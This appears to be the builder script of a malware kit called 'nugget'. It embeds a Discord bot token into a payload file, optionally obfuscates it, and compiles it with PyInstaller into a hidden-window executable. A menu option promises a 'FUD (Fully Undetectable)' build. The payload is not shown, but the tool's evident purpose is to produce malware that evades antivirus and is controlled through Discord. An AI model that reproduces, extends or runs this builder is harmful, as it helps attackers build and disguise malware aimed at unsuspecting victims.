import subprocess
import os
from cryptography.fernet import Fernet
import base64
import time
from etc import updater

updater.Update().update_checker


intro = """   
                                               __
              ____  __ __  ____   ____   _____/  |_ 
             /    \|  |  \/ ___\ / ___\_/ __ \   __\ 
            |   |  \  |  / /_/  > /_/  >  ___/|  |      Made by starshot
            |___|  /____/\___  /\___  / \___  >__|      
                 \/     /_____//_____/      \/     

                    Welcome to builder
        """


print(intro)

print("What do you want to do? \n [1] Build normal EXE \n [2] Make FUD (Fully Undetectable) EXE \n [3] Leave")

while True:
    choice = input("\n Make your choice: ").lower()
    if choice == "1":
        filename = 'nugget-v2.py'
        filepath = os.path.join(os.getcwd(), filename)

        os.system("cls")


        token = input('Enter you discord bot token: ')
        
        e_token = base64.b64encode(token.encode())

        with open(filepath, 'r', encoding='utf-8')as f:
            content = f.read()
            new_content = content.replace(f'"TOKEN"', f'{e_token}')

        with open(filepath, 'w') as f:
            f.write(new_content)
        
        subprocess.call(["pyinstaller", "--onefile", "--windowed", "etc/nugget-v2.py"])

        break
    
    if choice == "2":
        os.system("cls")

        token = input("Enter your discord bot token: ")
        e_tokenyetagain = base64.b64encode(token.encode())

        filename = 'nugget-v2.py'
        filepath = os.path.join(os.getcwd(), filename)

        with open(filepath, 'r', encoding='utf-8')as f:
            content = f.read()
            new_content = content.replace(f'"TOKEN"', f'{e_tokenyetagain}')

        with open(filepath, 'w') as f:
            f.write(new_content)

        print('Obfuscating file . . .')

        time.sleep(3)

        try:
            subprocess.call(["python", "etc/obfuscate.py"])

        except Exception as e:
            print("Something went wrong . . . Error: " + e)

        finally:
            print("Compiling file... Give it a moment . . .")
            time.sleep(3)
            subprocess.call(["pyinstaller", "--onefile", "--windowed", "etc/Obfuscated_nugget-v2.py"])
            os.system("cls")
            print("All done!")

        break



    elif choice == "3":
        print('goodbye')
        break

    else:
        print("Choice invalid.")
        os.system("cls")

